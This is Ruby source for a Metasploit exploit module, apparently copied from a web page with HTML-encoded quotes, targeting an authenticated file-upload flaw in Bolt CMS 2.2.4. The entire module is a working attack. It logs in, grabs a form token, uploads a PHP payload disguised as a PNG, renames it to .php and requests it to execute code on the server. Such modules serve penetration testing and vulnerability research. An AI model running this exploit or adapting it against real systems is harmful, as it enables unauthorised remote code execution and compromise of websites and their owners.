# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => &#039;CMS Bolt File Upload Vulnerability&#039;,
      &#039;Description&#039;     => %q{
          Bolt CMS contains a flaw that allows an authenticated remote
          attacker to execute arbitrary PHP code. This module was
          tested on version 2.2.4.
        },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Tim Coen&#039;, # Vulnerability Disclosure
        ],
      &#039;References&#039;      =>
        [
          [&#039;URL&#039;, &#039;http://blog.curesec.com/article/blog/Bolt-224-Code-Execution-44.html&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Aug 17 2015&#039;,
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;Bolt 2.2.4&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,  [true, &#039;The base path to the web application&#039;, &#039;/&#039;]),
        OptString.new(&#039;FOLDERNAME&#039;, [true, &#039;The theme path to the web application (default: base-2014)&#039;, &#039;base-2014&#039;]),
        OptString.new(&#039;USERNAME&#039;,   [true, &#039;The username to authenticate with&#039;]),
        OptString.new(&#039;PASSWORD&#039;,   [true, &#039;The password to authenticate with&#039;])
      ], self.class)
  end
 
  def check
    cookie = bolt_login(username, password)
    return Exploit::CheckCode::Detected unless cookie
 
    res = send_request_cgi(
      &#039;method&#039;      => &#039;GET&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;bolt&#039;),
      &#039;cookie&#039;      => cookie
    )
 
    if res && res.code == 200 && res.body.include?(&#039;Bolt 2.2.4</b>: Sophisticated, lightweight & simple CMS&#039;)
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end
 
  def username
    datastore[&#039;USERNAME&#039;]
  end
 
  def password
    datastore[&#039;PASSWORD&#039;]
  end
 
  def fname
    datastore[&#039;FOLDERNAME&#039;]
  end
 
  def bolt_login(user, pass)
    res = send_request_cgi(
      &#039;method&#039;      => &#039;GET&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;bolt&#039;, &#039;login&#039;)
    )
 
    fail_with(Failure::Unreachable, &#039;No response received from the target.&#039;) unless res
 
    session_cookie = res.get_cookies
    vprint_status("#{peer} - Logging in...")
    res = send_request_cgi(
      &#039;method&#039;      => &#039;POST&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;bolt&#039;, &#039;login&#039;),
      &#039;cookie&#039;      => session_cookie,
      &#039;vars_post&#039;   => {
        &#039;username&#039;  => user,
        &#039;password&#039;  => pass,
        &#039;action&#039;    => &#039;login&#039;
      }
    )
 
    return res.get_cookies if res && res.code == 302 && res.redirection.to_s.include?(&#039;/bolt&#039;)
    nil
  end
 
  def get_token(cookie, fname)
    res = send_request_cgi(
      &#039;method&#039;      => &#039;GET&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri, &#039;bolt&#039;, &#039;files&#039;, &#039;theme&#039;, fname),
      &#039;cookie&#039;      => cookie
    )
 
    if res && res.code == 200 && res.body =~ / name="form\[_token\]" value="(.+)" /
      return Regexp.last_match[1]
    end
    nil
  end
 
  def rename_payload(cookie, payload, fname)
    res = send_request_cgi(
      &#039;method&#039;      => &#039;POST&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;async&#039;, &#039;renamefile&#039;),
      &#039;vars_post&#039;   => {
        &#039;namespace&#039; => &#039;theme&#039;,
        &#039;parent&#039;    => fname,
        &#039;oldname&#039;   => "#{payload}.png",
        &#039;newname&#039;   => "#{payload}.php"
      },
      &#039;cookie&#039;      => cookie
    )
 
    return true if res && res.code == 200 && res.body.include?(&#039;1&#039;)
    nil
  end
 
  def exploit
    vprint_status("#{peer} - Authenticating using #{username}:#{password}")
 
    cookie = bolt_login(username, password)
    fail_with(Failure::NoAccess, &#039;Unable to login. Verify USERNAME/PASSWORD or TARGETURI.&#039;) if cookie.nil?
    vprint_good("#{peer} - Authenticated with Bolt.")
 
    token = get_token(cookie, fname)
    fail_with(Failure::Unknown, &#039;No token found.&#039;) if token.nil?
    vprint_good("#{peer} - Token \"#{token}\" found.")
 
    vprint_status("#{peer} - Preparing payload...")
    payload_name = Rex::Text.rand_text_alpha_lower(10)
 
    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, &#039;image/png&#039;, nil, "form-data; name=\"form[FileUpload][]\"; filename=\"#{payload_name}.png\"")
    data.add_part("#{token}", nil, nil, &#039;form-data; name="form[_token]"&#039;)
    post_data = data.to_s
 
    vprint_status("#{peer} - Uploading payload...")
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri, &#039;bolt&#039;, &#039;files&#039;, &#039;theme&#039;, fname),
      &#039;ctype&#039;     => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;      => post_data,
      &#039;cookie&#039;    => cookie
    )
 
    fail_with(Failure::Unknown, &#039;Unable to upload payload.&#039;) unless res && res.code == 302
    vprint_good("#{peer} - Uploaded the payload.")
 
    rename = rename_payload(cookie, payload_name, fname)
    fail_with(Failure::Unknown, &#039;No renamed filename.&#039;) if rename.nil?
 
    php_file_name = "#{payload_name}.php"
    payload_url = normalize_uri(target_uri.path, &#039;theme&#039;, fname, php_file_name)
    vprint_status("#{peer} - Parsed response.")
 
    register_files_for_cleanup(php_file_name)
    vprint_status("#{peer} - Executing the payload at #{payload_url}.")
    send_request_cgi(
      &#039;uri&#039;     => payload_url,
      &#039;method&#039;  => &#039;GET&#039;
    )
  end
end

